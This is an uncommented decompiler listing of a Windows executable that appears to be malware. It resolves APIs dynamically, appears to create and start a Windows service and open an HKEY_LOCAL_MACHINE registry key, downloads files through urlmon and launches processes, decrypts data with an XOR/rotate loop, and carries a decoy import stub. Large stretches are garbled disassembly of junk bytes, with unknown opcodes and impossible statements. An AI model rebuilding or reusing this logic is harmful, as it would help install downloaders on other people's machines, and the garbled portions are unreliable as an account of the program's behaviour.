        *L00405A94 = eax;
        (save)0;
        (save)4217500;
        (save)4217496;
        (save) *L00405A98;
        (save) *L00405A94;
        (save)3;
        (save)48;
        (save) *L00405A90;
        eax = L00401000("advapi32", *L00401E0E);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax != 0) {
            edi = *L00405A94;
            ecx = *L00405A9C;
            do {
                (save)edi;
                (save)ecx;
                *L00405AA0 = *edi;
                eax = *(edi + 4);
                *L00405AA4 = eax;
L00401ed7:
                *edi = *edi + ecx;
                bh = bh + bh;
                eax = eax ^ 4217504;
                (save) *L00405A90;
                L00401000("advapi32", *L00401ED3);
                if(eax != 0) {
                    eax = *eax();
                }
                if(eax != 0) {
                    goto L00401f08;
                }
L004020a7:
                (save)21;
                (save) *L00405AA0;
                (save) *L00405A90;
                eax = L00401000("advapi32", *L00401ED3);
                if(eax != 0) {
                    eax = *eax();
                }
                if(eax != 0) {
                    goto L004020d5;
                }
L004021f8:
                (restore)ecx;
                (restore)edi;
                edi = edi + 36;
                ecx = ecx - 1;
            } while(ecx != 0);
            goto L0040220c;
            ebp = ebp & *(ecx + 22);
            (fsave)tword [eax-0x1];
            goto L00401ed7;
L00401f08:
            *L00405AA8 = eax;
            (save)0x401f18;
            (save)0x401d39;
            return;
            (save)0x401f23;
            (save)0x401ad6;
            return;
            *(ebp - 4) = eax;
            goto L00401f2c;
            (restore)ecx;
            eax :: 905906958;
L00401f2c:
            al = *L6A00405A;
            *edx = *edx + ch;
            (save)0;
            (save)0;
            (save)0;
            (save) *(ebp - 4);
            (save)-1;
            (save)-1;
            (save)272;
            (save) *L00405AA8;
            L00401000("advapi32", *L00401F28);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax == 0) {
                goto L004020a7;
            }
            goto L00401f74;
            asm("wait");
            asm("pushf");
            esp = esp + 1;
            asm("Unknown opcode 0xc6");
L00401f74:
            (save)4217528;
            (save)1;
            (save) *L00405AA8;
            eax = L00401000("advapi32", *L00401F70);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax != 0) {
L00401f9d:
                (save)10;
                eax = L00401000("kernel32", *L004015F1);
                if(eax != 0) {
                    *eax();
                }
                goto L00401fbd;
                asm("jpo 0x401f8e");
                edx = edx + ecx;
L00401fbd:
                (save)4217528;
                (save) *L00405AA8;
                eax = L00401000("advapi32", *L00401FB9);
                if(eax != 0) {
                    *eax();
                }
                eax = *L00405ABC;
                if(eax != 1) {
                    goto L00401f9d;
                }
            }
            goto L00401ff0;
            asm("loope 0x401fd3");
            asm("Unknown opcode 0xc6");
            edi = 6946922;
L00401ff0:
            (save) *L00405AA8;
            L00401000("advapi32", *L00401FEC);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax != 0) {
                goto L004020a7;
            }
            (save) *L00405AA0;
            (save)0;
            (save)0;
            (save)0;
            (save)0;
            (save)0;
            (save) *L00405AB4;
            (save)-1;
            (save)-1;
            (save) *L00405AD4;
            (save) *L00405AA8;
            eax = L00401000("advapi32", *L00401F28);
            if(eax != 0) {
                *eax();
            }
            (save)2500;
            eax = L00401000("kernel32", *L004015F1);
            if(eax != 0) {
                eax = *eax();
            }
            (save)0x402081;
            (save)0x4017fe;
            return;
            if(eax == 0) {
                goto L004020a7;
            }
            goto L0040208d;
            asm("lahf");
            asm("xchg eax,ebp");
            al = *LFF006A10;
L0040208d:
            eax = eax ^ 0x402089;
            (save)"kernel32";
            L00401000();
            if(eax == 0) {
                goto L004020a7;
            }
            *eax();
            goto L004020a7;
L004020d5:
            *L00405AA8 = eax;
            (save)0x4020e5;
            (save)0x401d39;
            return;
            (save)0;
            (save)128;
            (save)3;
            (save)0;
            (save)3;
            (save)-1073741824;
            (save) *L00405AB4;
            eax = L00401000("kernel32", *L004019E4);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax == -1) {
                goto L004021f8;
            }
            *L00405AB0 = eax;
            (save) *L00405AB0;
            eax = L00401000("kernel32", *L004013F6);
            if(eax != 0) {
                eax = *eax();
            }
            (save) *L00405AB4;
            (save)0x402152;
            (save)0x4019dc;
            return;
            if(eax != 1) {
                goto L004021f8;
            }
            (save) *L00405AB4;
            (save)0x40216c;
            (save)0x401b4a;
            return;
            if(eax != 1) {
                goto L004021f8;
            }
            (save)0;
            (save)0;
            (save) *L00405AA8;
            eax = L00401000("advapi32", *L00401FEC);
            if(eax != 0) {
                eax = *eax();
            }
            if(eax == 0) {
                (save)250;
                eax = L00401000("kernel32", *L004015F1);
                if(eax != 0) {
                    eax = *eax();
                }
                (save)0x4021c3;
                (save)0x4017fe;
                return;
                if(eax == 0) {
                    goto L004021f8;
                }
            } else {
                goto L004021f8;
            }
            (save) *L00405AB4;
            (save)0x4021de;
            (save)0x401ca5;
            return;
            (save)0;
            eax = L00401000("kernel32", *L00402089);
            if(eax == 0) {
                goto L004021f8;
            }
            *eax();
            goto L004021f8;
        }
        goto L0040220c;
        asm("jecxz 0x402235");
        al = al - 15;
L0040220c:
        (save) *L00405A90;
        eax = L00401000("advapi32", *L00402208);
L00402221:
        if(eax != 0) {
            eax = *eax();
        }
    }
    (restore)ebp;
    return;
    asm("in eax,dx");
    asm("retf");
    bl :: *edi;
    eax = eax | *eax;
    asm("bound ecx,[edi]");
    asm("cld");
    asm("Unknown opcode 0x8f");
    asm("cmc");
    asm("pushf");
    asm("loopne 0x4021c0");
    al = (al | 116) + 97;
    al = *esi;
    esi = esi + 1;
    asm("iret");
    asm("into");
    if(dl <= *(ebx + ebp * 4)) {
        asm("xchg eax,esi");
        asm("rep add [edi],al");
        *(esp + edx) = *(esp + edx) + dh;
        *(ebx + 1310761424) = fs;
        goto L00402221;
    }
    dl :: *L0F00B3CB;
    ch = ch + dh;
    ah = 185;
    asm("out dx,eax");
    asm("adc ecx,0x40014a64");
    al :: 80;
    asm("insd");
    bh = bh | dl;
    *edi = *esi;
    edi = edi + 4;
    if(!(esi = esi + 4)) {
        edi = edi - 1;
        ecx = ecx | *(ebx + 34);
        eax = *L0EC3AFC0;
    }
    asm("popa");
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    return;
    *(ebp + 60) = *(ebp + 60) + bh;
    1682605782 = *edi * edi;
    asm("a16 aaa");
    bh = al;
    edx = edx + 1;
    eax = eax - -375642301;
    asm("aas");
    (restore)esp;
    asm("%c pop edx");
    (fsave) *(edx + -1645029226);
    dh = 194;
    *edi = *esi;
    edi = edi + 4;
    esi = esi + 4;
    asm("int3");
    asm("adc esi,[ebp+0x51]");
    *edi :: dh;
    (save)esp;
    asm("o16 pop es");
    asm("Unknown opcode 0x0f");
    asm("jpo 0x4022f0");
    asm("%c dec esp");
    ebp = ebp & *L00330043;
    asm("les edx,[edi+0x97d14e01]");
    asm("adc [eax+0xe2abeae7],dh");
    al = 57;
    if(esp = esp + 1) {
        goto L00402221;
    }
    *(ebp + -675947296) = *(ebp + -675947296) >> cl;
    ah = 90;
    *ecx = *ecx - bh;
    *esi = *esi - ebp;
    ebp = ebp + 1;
    (save)ecx;
    asm("aaa");
    bh = 195;
    *(edi + edi * 2 + 40) :: ah;
    asm("in eax,dx");
    (save)cs;
    asm("in al,dx");
    asm("wait");
    if(!( *(ebp + 1643549435) & dl)) {
        asm("lds ebx,[ecx+0x3f4adf9c]");
        (restore)esi;
        (save)ds;
        al - 108 :: 89;
        ecx = ecx + 1;
    }
    asm("das");
    asm("popa");
    asm("adc eax,0xe88d3563");
    edi = edi - 1;
    eax :: -1345943564;
    asm("sbb al,0x73");
    asm("das");
    ecx = ecx + 1;
}

stack space not deallocated on return
/*	Procedure: 0x00402306 - 0x0040237A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402306()
{



    asm("cmpsd");
    ah = 218;
    asm("fnsave [edi+esi*4+0x62f182d9]");
    (save)ss;
    asm("xchg eax,ebp");
    asm("hlt");
    eax = *(ebx + 218119762)();
    *(eax + 37) = *(eax + 37) + dh;
    asm("aam 0x86");
    (restore)es;
    if(!(ebx = ebx - 1)) {
        asm("insb");
        asm("sbb al,0x55");
        *(edx + 27) = *(edx + 27) ^ edi;
        asm("arpl [edi],dx");
        *(esp + edx + 93) = *(esp + edx + 93) & eax;
        esp = esp + 1;
        bl = bl - *(edx + edi * 8 + 100725915);
        asm("xchg eax,edx");
        asm("loop 0x402341");
        asm("pusha");
        asm("daa");
        (save)ebp;
        if(!( *(esi + 61) = *(esi + 61) + cl)) {
            asm("into");
            *edi = *esi;
            edi = edi + 4;
            *edi = *edi + cl;
            *(edx + 1614696687) = *(edx + 1614696687) + bh;
            *(esi + 4 + -496297784) = *(esi + 4 + -496297784) | esp;
        }
    }
    asm("xchg eax,esi");
    asm("lock xchg eax,ecx");
    edx = 1779965546;
    if(!(eax = eax + -371803543)) {
        cl = 223;
        ebx = ebx - 1;
        al = al - 92;
        *ebx = *ebx + bh;
        (save)ebp;
        ebp = esp;
        (save)"";
        (save)0x40237b;
    }
    (save)0x401266;
}

stack space not deallocated on return
/*	Procedure: 0x0040237B - 0x00402564
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040237B()
{



    (save)4214796;
    (save)4218853;
    eax = L00401000("kernel32", *L00401652);
    if(eax != 0) {
        eax = *eax();
    }
    goto L004023a3;
    asm("salc");
    bh = bh >> 1;
    asm("rep push dword 0x402364");
L004023a3:
    (save)4218853;
    L00401000("kernel32", *L0040239F);
    if(eax != 0) {
        *eax();
    }
    (save) *(ebp + 8);
    (save)4218853;
    eax = L00401000("kernel32", *L0040239F);
    if(eax != 0) {
        *eax();
    }
    (save)4221205;
    (save)131097;
    (save)0;
    (save)4218853;
    (save)-2147483646;
    eax = L00401000("advapi32", *L00401845);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax == 0) {
        *L00406B19 = 1024;
        *L00406B1D = 1;
        (save)0x402317;
        (save)0x40243e;
        (save)0x401266;
        return;
        (save)4221721;
        (save)4218853;
        (save)4221725;
        (save)0;
        (save)4214796;
        (save) *L00406915;
        eax = L00401000("advapi32", *L004018A1);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax == 0) {
            (save)0x402334;
            (save)0x40248a;
            (save)0x401266;
            return;
            (save)4218853;
            (save)4214796;
            (save)0x40249f;
            (save)0x401288;
            return;
            if(eax > 0) {
                *L00406B19 = 512;
                (save)0x402343;
                (save)0x4024c3;
                (save)0x401266;
                return;
                (save)4221721;
                (save)4218853;
                (save)4221725;
                (save)0;
                (save)4214796;
                (save) *L00406915;
                eax = L00401000("advapi32", *L004018A1);
                if(eax != 0) {
                    eax = *eax();
                }
                if(eax == 0) {
                    (save)4218853;
                    (save)0x402366;
                    (save)0x402510;
                    (save)0x401288;
                    return;
                    if(eax > 0) {
                        (save)100;
                        (save)eax + 4218853 - 1;
                        (save)4220901;
                        eax = L00401000("kernel32", *L004012F0);
                        if(eax != 0) {
                            *eax();
                        }
                        *L00406B21 = 1;
                    }
                }
            }
        }
    }
    (save) *L00406915;
    eax = L00401000("kernel32", *L004013F6);
    if(eax != 0) {
        eax = *eax();
    }
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00402565 - 0x00402582
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402565()
{



    (save)ebp;
    ebp = esp;
    esp = esp + -8;
    *L00406B21 = 0;
    (save)"";
    (save)0x402583;
    (save)0x401266;
}

stack space not deallocated on return
/*	Procedure: 0x00402583 - 0x0040263D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402583()
{



    (save)4221201;
    (save)131097;
    (save)0;
    (save)4214796;
    (save)-2147483646;
    eax = L00401000("advapi32", *L00401845);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax == 0) {
        *(ebp - 4) = 0;
        do {
            *L00406B19 = 512;
L004025cb:
            (save)0;
            (save)0;
            (save)0;
            (save)0;
            (save)4221721;
            (save)4221209;
            (save) *(ebp - 4);
            (save) *L00406911;
            eax = L00401000("advapi32", *L004025C7);
            if(eax != 0) {
                eax = *eax();
            }
            *(ebp - 8) = eax;
            if(eax == 0) {
                goto L00402605;
            }
        } while(*(ebp - 8) == 0);
        goto L0040261e;
        >= ? L004025ca : ;
        *edx & ecx;
        goto L004025cb;
L00402605:
        *(ebp - 4) = *(ebp - 4) + 1;
        (save)4221209;
        (save)0x402618;
        (save)0x402368;
        return;
    }
L0040261e:
    (save) *L00406911;
    eax = L00401000("kernel32", *L004013F6);
    if(eax != 0) {
        eax = *eax();
    }
    (restore)ebp;
}

/*	Procedure: 0x0040263E - 0x004026D1
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L0040263E(A8)
/* unknown */ void  A8;
{



    goto "ëKb”\nh";
    != ? 0x4026b8 : ;
    asm("%g jc 0x40267b");
    al = al ^ *eax;
    goto L00402650;
    ebx = ebx - 1;
    asm("bound edx,[edx+ecx+0x40068]");
L00402650:
    *(eax - 27) = *(eax - 27) + ch;
    asm("arpl [eax+0x0],ax");
    (save)A8;
    L00401000("user32", *L0040264C);
    if(eax != 0) {
        eax = *eax();
    }
    goto L0040267b;
    esi = 1761149847;
L0040267b:
    asm("lodsd");
    (save)-446169024;
    asm("arpl [eax+0x0],ax");
    L00401000("kernel32", *L00402677);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax == 0) {
        goto L004026a7;
        if(bh = bh + *esi) {
            goto L0040267b;
        }
L004026a7:
        (save)0;
        (save)0;
        (save)130;
        (save)A8;
        (save) *L004026A3;
        (save)"user32";
        L00401000();
        if(eax != 0) {
            *eax();
        }
    }
    return(1);
}

stack space not deallocated on return
/*	Procedure: 0x004026D2 - 0x00402763
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004026D2()
{



L004026d2:
    (save)100;
    (save)4221101;
    (save)0x40225a;
    (save)0x4026e9;
    (save)0x401231;
    return;
    goto L004026ef;
    asm("in al,dx");
    asm("aam 0x4b");
    *edx = *edx >> cl;
L004026ef:
    (save)0x40263e;
    L00401000("user32", *L004026EB);
    if(eax != 0) {
        eax = *eax();
    }
    (save)100;
    (save)4221101;
    (save)0x40227b;
    (save)0x402725;
    (save)0x401231;
    return;
    (save)0;
    (save)0x40263e;
    eax = L00401000("user32", *L004026EB);
    if(eax != 0) {
        *eax();
    }
    (save)50;
    eax = L00401000("kernel32", *L004015F1);
    if(eax != 0) {
        eax = *eax();
    }
    goto L004026D2;
}

stack space not deallocated on return
/*	Procedure: 0x00402764 - 0x004027A9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402764()
{



    goto L0040276a;
    asm("adc eax,[eax-0x13]");
    *(eax + 29) = *(eax + 29) + ch;
L0040276a:
    106 = *eax * eax;
    *edx = *edx + ch;
    (save)0x4026d2;
    (save)0;
    (save)0;
    L00401000("kernel32", *L00402766);
    if(eax != 0) {
        *eax();
    }
    eax = *L0040222C ^ 188;
    (save)eax;
    (save)0x4027aa;
    (save)0x401370;
}

/* DEST BLOCK NOT FOUND: 004027ac -> 00402979 */
/* DEST BLOCK NOT FOUND: 004027c4 -> 00402979 */
stack space not deallocated on return
/*	Procedure: 0x004027AA - 0x00402979
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004027AA()
{



    if(eax != 0) {
        (save)0x4027bd;
        (save)0x402565;
        return;
        if(*L00406B21 == 1) {
            (save)0x402230;
            (save)0x4027da;
            (save)0x401266;
            return;
            (save)4214796;
            (save)4218853;
            eax = L00401000("kernel32", *L00401652);
            if(eax != 0) {
                eax = *eax();
            }
            (save)0x402249;
            (save)0x40280c;
            (save)0x401266;
            return;
            (save)4214796;
            (save)4218853;
            eax = L00401000("kernel32", *L0040239F);
            if(eax != 0) {
                *eax();
            }
            (save)4220901;
            (save)4218853;
            eax = L00401000("kernel32", *L0040239F);
            if(eax != 0) {
                eax = *eax();
            }
            *L00406B25 = 68;
            goto L00402860;
            *(esi + 1768474892) = *(esi + 1768474892) << 107;
L00402860:
            *(eax + 1 + 37) = *(eax + 1 + 37) + ch;
            106 = *eax * eax;
            *edx = *edx + ch;
            (save)0;
            (save)0;
            (save)0;
            (save)0;
            (save)4218853;
            (save)0;
            L00401000("kernel32", *L0040285C);
            if(eax != 0) {
                *eax();
            }
L00402895:
            (save)2;
            eax = L00401000("kernel32", *L004015F1);
            if(eax != 0) {
                *eax();
            }
            eax = *L0040222C ^ 122;
            (save)eax;
            (save)0x4028c3;
            (save)0x401370;
            return;
            if(eax != 0) {
                goto L00402895;
            }
L004028c7:
            (save)0x402230;
            (save)0x4028d7;
            (save)0x401266;
            return;
            (save)4214796;
            (save)0x4028e7;
            (save)0x40105b;
            return;
            (save)eax;
            (save)0x4028f3;
            (save)0x401370;
            return;
            (save)eax;
            (save)0;
            (save)1;
            eax = L00401000("kernel32", *L0040177A);
            if(eax != 0) {
                eax = *eax();
            }
            (save)0;
            (save)eax;
            eax = L00401000("kernel32", *L004017A2);
            if(eax != 0) {
                *eax();
            }
            (save)2;
            eax = L00401000("kernel32", *L004015F1);
            if(eax != 0) {
                eax = *eax();
            }
            (save)0x402230;
            (save)0x402955;
            (save)0x401266;
            return;
            (save)4214796;
            (save)0x402965;
            (save)0x40105b;
            return;
            (save)eax;
            (save)0x402971;
            (save)0x401370;
            return;
            if(eax != 0) {
                goto L004028c7;
            }
        }
    }
}

/*	Procedure: 0x0040297A - 0x0040298C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040297A()
{



    *eax = *eax + cl;
    *(ecx + 52) = *(ecx + 52) + bh;
    ecx = ecx - 1;
    (restore)ebx;
    cl = cl ^ *L2180D408;
    (restore)edi;
    edx = edx ^ *(ebx + 4155639);
}

/* DEST BLOCK NOT FOUND: 004029b0 -> 00402a64 */
/* DEST BLOCK NOT FOUND: 00402a5e -> 00402a64 */
/* DEST BLOCK NOT FOUND: 00402a62 -> 00402a64 */
stack space not deallocated on return
/*	Procedure: 0x0040298D - 0x00402A64
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040298D()
{



    (save)983103;
    (save)0;
    (save)0;
    eax = L00401000("advapi32", *L00401DDD);
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != 0) {
        *L00405AA8 = eax;
        (save)0x40297a;
        (save)0x4029cb;
        (save)0x401266;
        return;
        (save)983551;
        (save)4214796;
        (save) *L00405AA8;
        eax = L00401000("advapi32", *L00401ED3);
        if(eax != 0) {
            eax = *eax();
        }
        if(eax != 0) {
            *L00406B79 = eax;
            (save)4221821;
            (save)1;
            (save) *L00406B79;
            L00401000("advapi32", *L00401F70);
            if(eax != 0) {
                *eax();
            }
            goto L00402a28;
            asm("int 0x61");
            >= ? 0x402a09 : ;
L00402a28:
            (save) *L00406B79;
            eax = L00401000("advapi32", *L00402A24);
            if(eax != 0) {
                *eax();
            }
        }
        (save) *L00405AA8;
        if(L00401000("advapi32", *L00402208) != 0) {
            *eax();
        }
    }
}

/*	Procedure: 0x00402A65 - 0x00402AB5
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402A65()
{



    CloseHandle();
    DestroyWindow();
    CreateMutexA();
    FreeLibrary();
    PostQuitMessage();
    SendDlgItemMessageW();
    EnterCriticalSection();
    GetPrivateProfileStringA();
    GetFileSize();
    TranslateMessage();
    GetModuleFileNameA();
    CreateEventA();
    MessageBoxW();
    DrawFocusRect();
    GlobalLock();
    return(GetCommandLineA());
}

/*	Procedure: 0x00402AB6 - 0x00402AD0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402AB6()
{



    *(eax + eax) = *(eax + eax) + cl;
    bl = bl ^ 233;
    asm("lahf");
    esi = 712055261;
    ebp = ebp + 1;
    (save)ds;
    asm("insd");
    ebp = ebp + 1;
    *LDF66031B = *LDF66031B ^ esi;
    asm("cmpsd");
    *edi = al;
    edi = edi + 1;
    asm("iret");
}

stack space not deallocated on return
/*	Procedure: 0x00402AD1 - 0x00402C48
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00402AD1()
{



    ebx = ebx + 1;
    asm("arpl [eax],ax");
    eax = eax + *eax;
    dh = 213;
    *(ebx + -1957305160) = esi;
    asm("in al,dx");
    esp = esp + -12;
    *(ebp - 8) = 0;
L00402ae9:
    eax = *L00413E46;
    *(ebp - 12) = eax;
    eax = *(ebp - 12) + *L00413E4A;
    *L00413E46 = eax;
    (save) *L00413E46;
    eax = L00401000("kernel32", *L004015F1);
    if(eax != 0) {
        *eax();
    }
    (save)261;
    (save)64;
    eax = L00401000("kernel32", *L00401806);
    if(eax != 0) {
        eax = *eax();
    }
    *(ebp - 4) = eax;
    (save)260;
    (save) *(ebp - 4);
    (save)0x402ad3;
    (save)0x402b4f;
    (save)0x401231;
    return;
    goto L00402b55;
L00402b54:
    bl = 255;
L00402b55:
    if(ch = ch - 150) {
        goto L00402b54;
    }
    (save)0;
    (save)0;
    (save) *(ebp - 4);
    eax = L00401000("kernel32", *L00402B51);
    if(eax != 0) {
        *eax();
    }
    goto L00402b80;
    != ? 0x402bed : ;
    asm("insb");
    asm("insd");
    asm("outsd");
    asm("outsb");
    bl = bl + ch;
L00402b80:
    al = al + 93;
    asm("adc [ebx+0x6a006ae2],bl");
    while(bh = bh + bh) {
    }
    (save) *(ebp + 8);
    (save)0;
    eax = L00401000("urlmon", *L00402B82);
    if(eax != 0) {
        eax = *eax();
    }
    *(ebp - 8) = *(ebp - 8) + 1;
    if(eax != 0 && *(ebp - 8) < 4) {
        goto L00402ae9;
    }
    *L00406BCC = 1;
    *L00406BD0 = 10;
    (save)4221924;
    (save)4221856;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save) *(ebp - 4);
    (save)0;
    (save) *L0040285C;
    (save)"kernel32";
    L00401000();
    if(eax != 0) {
        eax = *eax();
    }
    if(eax != 0) {
        (save)0;
        eax = L00401000("kernel32", *L00402089);
        if(eax != 0) {
            *eax();
        }
    }
    *L00413E4E = *L00413E4E - 1;
L00402c26:
    (save)10000;
    eax = L00401000("kernel32", *L004015F1);
    if(eax != 0) {
        *eax();
    }
    goto L00402c26;
    (restore)ebp;
}

/*	Procedure: 0x00402C49 - 0x00402C8C
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402C49()
{



    while(1) {
L00402c4f:
        *ecx :: al;
        L00401000("kernel32", *L00402C4B);
        if(eax != 0) {
            *eax();
        }
        (save)250;
        eax = L00401000("kernel32", *L004015F1);
        if(eax != 0) {
            eax = *eax();
        }
    }
    (save)esi;
    asm("xchg cl,[ecx+0x3435ffdf]");
    goto L00402c4f;
}

stack space not deallocated on return
/*	Procedure: 0x00402C8D - 0x00402DB8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402C8D()
{



    *L00413E4E = 0;
    goto L00402c9b;
    >= ? 0x402cda : ;
    *(edi + edi * 8 + 53) = *(edi + edi * 8 + 53) - ebp;
L00402c9b:
    asm("xchg eax,edi");
    *(al - 64 + 43) = *(al - 64 + 43) + ch;
    asm("adc [eax+0x0],eax");
    L00401000();
    if(eax != 0) {
        eax = *eax();
    }
    goto L00402cb9;
    esp = esp + ebx;
    *(eax + 1094466664) = *(eax + 1094466664) << 1;
L00402cb9:
    *(eax + 5) = *(eax + 5) + ch;
    *eax = *eax + eax;
    bh = bh + bh;
    eax = eax ^ 0x402cb5;
    (save)"kernel32";
    L00401000();
    if(eax != 0) {
        eax = *eax();
    } else {
        goto L00402ce1;
        *(eax + ebp * 8 + -583663699) & eax;
    }
L00402ce1:
    *(al - 64 + 43) = *(al - 64 + 43) + ch;
    asm("adc [eax+0x0],eax");
    L00401000();
    if(eax != 0) {
        eax = *eax();
    }
    *L00413834 = eax + 12;
    (save)0;
    (save)128;
    (save)3;
    (save)0;
    (save)3;
    (save)-2147483648;
    (save) *L00413834;
    eax = L00401000("kernel32", *L004019E4);
    if(eax != 0) {
        eax = *eax();
    }
    *L00406EDC = eax;
    (save)0;
    (save)4274224;
    (save)50000;
    (save)4224224;
    (save) *L00406EDC;
    eax = L00401000("kernel32", *L00401A76);
    if(eax != 0) {
        *eax();
    }
    (save) *L00406EDC;
    eax = L00401000("kernel32", *L004013F6);
    if(eax != 0) {
        *eax();
    }
    al = -1480149857;
    edi = 4224224;
    ecx = 10000;
    asm("repne scasd");
    eax = *edi & 255;
    edi = edi + 1;
    ecx = *edi;
    edi = edi + 4;
    (save)edi;
    (save)ecx;
    (save)0;
    (save)eax;
    (save)ecx;
    (save)edi;
    (save)0x402db9;
    (save)0x402f8c;
}

/* DEST BLOCK NOT FOUND: 00402f85 -> 00402f8b */
/* DEST BLOCK NOT FOUND: 00402f89 -> 00402f8b */
/*	Procedure: 0x00402DB9 - 0x00402F8B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402DB9()
{



    (restore)ecx;
    (restore)edi;
    *L00406B9C = edi;
    edi = edi + ecx;
    eax = ( *edi & 255) << 10;
    *L00413E46 = eax;
    *L00413E4A = *L00413E46;
    (save)4217484;
    (save)0;
    (save)0;
    (save)0x402c49;
    (save)0;
    (save)0;
    eax = L00401000("kernel32", *L00402766);
    if(eax != 0) {
        *eax();
    }
    (save) *L00406B9C;
    (save)4274232;
    eax = L00401000("kernel32", *L00401652);
    if(eax != 0) {
        *eax();
    }
    *L00413C38 = *L00406B9C;
    while(1) {
        eax = 0;
        (save)4274232;
        eax = L00401000("kernel32", *L0040128D);
        if(eax != 0) {
            eax = *eax();
        }
        (save)eax + 1;
        (save)64;
        eax = L00401000("kernel32", *L00401806);
        if(eax != 0) {
            eax = *eax();
        }
        *L00413E52 = eax;
        (save)4274232;
        (save) *L00413E52;
        eax = L00401000("kernel32", *L00401652);
        if(eax != 0) {
            *eax();
        }
        (save)4217484;
        (save)0;
        (save) *L00413E52;
        (save)0x402adc;
        (save)0;
        (save)0;
        eax = L00401000("kernel32", *L00402766);
        if(eax != 0) {
            *eax();
        }
        (save)3000;
        eax = L00401000("kernel32", *L004015F1);
        if(eax != 0) {
            *eax();
        }
        *L00413E4E = *L00413E4E + 1;
        eax = 0;
        ebx = *L00413C38;
        do {
            ebx = ebx + 1;
        } while(*ebx != 0);
        ebx = ebx + 1;
        if(*ebx == 0) {
            break;
        }
        *L00413C38 = ebx;
        (save) *L00413C38;
        (save)4274232;
        eax = L00401000("kernel32", *L00401652);
        if(eax != 0) {
            *eax();
        }
    }
    do {
        (save)50;
        eax = L00401000("kernel32", *L004015F1);
        if(eax != 0) {
            *eax();
        }
    } while(*L00413E4E != 0);
    (save)14000;
    eax = L00401000("kernel32", *L004015F1);
    if(eax != 0) {
        *eax();
    }
    (save)0;
    if(L00401000("kernel32", *L00402089) != 0) {
        *eax();
    }
}

/* DEST BLOCK NOT FOUND: 00403047 -> 00403088 */
stack space not deallocated on return
/*	Procedure: 0x00402F8C - 0x0040306E
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L00402F8C()
{



    (save)ebp;
    ebp = esp;
    (save)ebx;
    (save)ecx;
    (save)edx;
    ecx = 0;
    eax = *(ebp + 8) + *(ebp + 20);
    edx = *(ebp + 16);
    do {
        bh = *eax;
        (save)edx;
        edx = 0;
        (restore)edx;
        asm("rol dl,0x3");
        (save)edx;
        edx = 0;
        (restore)edx;
        bh = bh ^ dl;
        (save)edx;
        edx = 0;
        (restore)edx;
        asm("ror bh,0x4");
        (save)edx;
        edx = 0;
        (restore)edx;
        bh = bh ^ cl;
        (save)edx;
        edx = 0;
        (restore)edx;
        *eax = bh;
        (save)edx;
        edx = 0;
        (restore)edx;
        eax = eax + 1;
    } while(ecx + 1 < *(ebp + 12));
    (restore)edx;
    (restore)ecx;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    *esi = *esi + ch;
    *(edx + 1) = *(edx + 1) + al;
    *(edi + 95) = *(edi + 95) ^ bl;
    dh = dh - *ebx;
    (restore)edi;
    cl = cl - *(esi + 104);
    eax = eax - 1;
    asm("fbstp tword [ecx+0xed99deb1]");
    asm("pusha");
    eax = eax + 1;
    ebx = 1249123805;
    asm("cmpsd");
    (save)eax;
    if(!(al = al & 195)) {
        (restore)edx;
        if(!(edi = edi + *ecx)) {
            *(esi + 44) :: edx;
            *L52CFBBC2 = eax;
            if(esi = esi - 1) {
                goto L0040303f;
            }
            asm("insd");
        }
        asm("xchg eax,ebx");
        bh = 210;
        asm("Unknown opcode 0xc1");
        bl = 21;
        asm("jpo 0x402fd2");
        asm("into");
        asm("lds ebp,[ecx+0x82d5e3c3]");
        asm("Unknown opcode 0xfe");
        asm("xchg eax,edi");
        (restore)ss;
        if(edi = edi + *(ebx - 25)) {
            goto L00403069;
        }
        (restore)esi;
        > ? L00403042 : ;
        *(esi - 119) = *(esi - 119) + esi;
        eax & -242206094;
        asm("clc");
L0040303f:
        asm("xchg eax,esp");
        return;
        asm("cmpsb");
        asm("Unknown opcode 0x0f");
        if(!(cl = cl & *(edi + esi + 83))) {
        }
        asm("adc al,0x0");
        <= ? L00403088 : ;
    }
    asm("xchg eax,edi");
    asm("rep adc al,0x7b");
    ah = 214;
    asm("stc");
    asm("pushf");
    (restore)esp;
    < ? L00403014 : ;
    *ebx :: -1846115240;
    *(edx + 32) = *(edx + 32) + 1;
    asm("adc dh,[ebx+0x3b]");
    edi = edi - 1;
    asm("Unknown opcode 0xc4");
    asm("in al,0x56");
    al = al + 228;
    *(ebx + 26) :: -1644649280;
L00403069:
    asm("popf");
    asm("out dx,eax");
}

stack space not deallocated on return
/*	Procedure: 0x0040306F - 0x004030D4
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    L0040298D();
    eax = 0;
    L0040161D();
    eax = 1;
